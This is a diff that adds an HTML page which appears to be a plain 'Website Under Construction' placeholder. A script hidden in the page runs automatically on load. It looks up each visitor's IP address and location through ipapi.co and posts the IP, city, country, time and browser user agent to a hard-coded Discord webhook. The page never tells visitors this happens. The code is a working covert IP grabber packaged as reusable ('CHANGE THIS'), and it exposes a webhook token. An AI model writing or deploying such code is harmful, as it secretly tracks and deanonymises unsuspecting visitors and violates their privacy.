@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Website Under Construction</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #ffffff;
+      color: #222;
+      font-family: Arial, Helvetica, sans-serif;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+    .container {
+      max-width: 400px;
+    }
+    h1 {
+      font-size: 34px;
+      margin-bottom: 16px;
+    }
+    p {
+      font-size: 18px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Website Under Construction</h1>
+    <p>We're working on something big.<br>Come back later.</p>
+  </div>
+
+  <script>
+    // ================== CHANGE THIS ==================
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1516409431368269934/4qmFB9N79B2tVd0xWvh221dwRWNZ6gAJBwmrWW1nlKP_FkAA2JohWRG4G4RU-n8k_e_X";
+
+    async function sendVisitorInfo() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: "**New Visitor**",
+            embeds: [{
+              title: "Visitor Details",
+              color: 0x3498db,
+              fields: [
+                { name: "IP", value: data.ip || "Unknown", inline: true },
+                { name: "Location", value: `${data.city || 'Unknown'}, ${data.country_name || ''}`, inline: true },
+                { name: "Time", value: new Date().toLocaleString(), inline: false },
+                { name: "Device", value: navigator.userAgent.substring(0, 80) + "...", inline: false }
+              ]
+            }]
+          })
+        });
+      } catch (e) {
+        console.log("Error");
+      }
+    }
+
+    window.onload = () => setTimeout(sendVisitorInfo, 700);
+  </script>
+</body>
+</html>
